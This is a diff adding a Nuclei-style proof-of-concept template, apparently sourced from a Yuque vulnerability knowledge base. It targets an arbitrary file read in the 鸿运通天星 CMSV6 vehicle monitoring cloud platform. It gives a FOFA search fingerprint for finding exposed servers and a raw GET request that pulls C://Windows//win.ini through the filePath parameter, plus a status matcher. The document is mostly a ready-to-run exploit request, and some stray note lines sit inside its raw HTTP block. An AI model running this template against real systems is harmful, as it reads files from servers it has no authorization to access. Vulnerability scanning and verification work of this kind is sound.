@@ -1,0 +1,40 @@
+id: poc-qvv3l8fru1whsn0g
+info:
+  name: 鸿运通天星CMSV6车载主动安全监控云平台任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qvv3l8fru1whsn0g'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qvv3l8fru1whsn0g
+    fofa: body="./open/webApi.html"||body="/808gps/"
+http:
+- raw:
+  - 'GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    support
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
